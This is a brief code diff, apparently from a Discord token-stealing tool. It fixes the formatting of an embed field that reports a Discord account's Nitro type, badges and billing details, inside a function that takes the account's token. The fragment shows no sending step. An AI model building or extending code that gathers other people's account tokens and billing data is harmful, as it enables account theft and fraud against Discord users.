@@ -865,7 +865,7 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Info**',
-            value: `🚀 Nitro Type: `${nitro}`\n 🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
+            value: `🚀 Nitro Type: **${nitro}**\n 🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
             inline: true,
           },
           {
